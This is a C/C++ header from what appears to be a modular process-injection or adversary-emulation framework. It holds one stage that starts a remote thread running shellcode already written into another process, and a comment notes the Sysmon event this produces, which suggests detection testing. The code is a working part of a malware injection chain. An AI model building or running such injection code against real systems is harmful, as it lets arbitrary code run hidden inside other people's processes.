#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"
#include "../context.h"

// T5.4 — Remote thread execution
//
// Creates a new thread inside the target process whose entry point is the
// shellcode buffer written at L4. Must be paired with T2.3 (alloc_remote)
// and T4.3 (write_remote). The shellcode runs in the target's address
// space, surfacing as a Sysmon Event 8 (CreateRemoteThread) with cross-
// process source/target images.
inline BOOL Stage5_Exec_RemoteThread(TechniqueContext* ctx)
{
    if (!ctx || !ctx->allocated_mem || !ctx->target_process)
        return FALSE;

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 5", "Remote thread at %p in target process",
              ctx->allocated_mem);
#endif

    HANDLE hThread = MyCreateThreadEx(
        ctx->target_process,
        (LPTHREAD_START_ROUTINE)ctx->allocated_mem,
        NULL,
        0
    );

    if (!hThread) {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 5", "CreateRemoteThread failed");
#endif
        return FALSE;
    }

    MyWaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return TRUE;
}
